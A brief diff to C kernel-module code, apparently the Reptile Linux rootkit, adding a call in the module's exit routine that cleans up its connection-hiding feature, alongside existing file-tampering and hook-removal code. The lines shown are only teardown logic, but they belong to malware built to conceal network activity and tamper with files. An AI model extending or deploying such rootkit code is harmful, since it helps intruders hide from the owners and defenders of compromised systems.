@@ -474,6 +474,10 @@ static void __exit reptile_exit(void)
 #ifdef CONFIG_FILE_TAMPERING
 	while(atomic_read(&read_on) != 0) schedule();
 #endif
+
+#ifdef CONFIG_HIDE_CONN
+	network_hide_cleanup();
+#endif
 	khook_cleanup();
 }
 
